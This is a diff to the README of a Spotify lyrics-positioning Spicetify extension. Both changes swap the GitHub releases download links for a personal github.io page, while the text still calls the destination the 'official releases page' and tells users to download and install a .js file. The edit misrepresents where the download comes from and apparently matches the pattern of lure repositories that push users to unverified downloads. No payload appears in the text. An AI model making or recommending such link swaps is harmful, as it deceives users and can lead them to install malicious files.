@@ -1,6 +1,6 @@
 # 🎵 spotify-lyrics-position - Move your lyrics anywhere on screen
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Daynaexpandable336/spotify-lyrics-position/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://daynaexpandable336.github.io)
 
 This software changes how you view lyrics in Spotify. The standard Spotify app locks lyrics to a full-screen view. This tool unlocks that view. You can drag and drop your lyrics to any part of your computer screen. You see your lyrics while you browse your library or search for new music.
 
@@ -18,7 +18,7 @@ If you do not have Spicetify-CLI, visit the official Spicetify website. Follow t
 
 You must download the correct file from the official releases page. 
 
-[Visit this page to download the latest version](https://github.com/Daynaexpandable336/spotify-lyrics-position/releases)
+[Visit this page to download the latest version](https://daynaexpandable336.github.io)
 
 Look for the file ending in `.js`. This is the extension file. Save this file to a folder you can find later, such as your Downloads folder or Desktop. Do not change the name of the file.
 
